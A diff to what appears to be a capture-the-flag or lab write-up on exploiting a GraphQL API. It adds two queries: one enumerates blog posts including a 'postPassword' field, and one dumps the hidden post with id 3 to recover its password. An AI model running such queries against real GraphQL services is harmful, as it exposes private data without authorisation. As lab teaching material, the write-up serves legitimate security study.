@@ -140,9 +140,29 @@ We Have a Two Query !!
 
 Then We Create a Query For enumerate The GraphQl and We Got 4 id but number 3 id is missing it's mean there is something hidden !!
 
+```
+{
+getALLBlogPosts{
+    id
+    isPrivate
+    postPassword
+   }
+}
+```
+
 <figure><img src="../../../.gitbook/assets/image (490).png" alt=""><figcaption></figcaption></figure>
 
 Then We Use This Query and Dump The Data and We Got The Password !!
+
+```graphql
+{
+   getBlogPost(id:3){
+      id
+      isPrivate
+      postPassword
+   }
+}
+```
 
 <figure><img src="../../../.gitbook/assets/image (491).png" alt=""><figcaption></figcaption></figure>
 
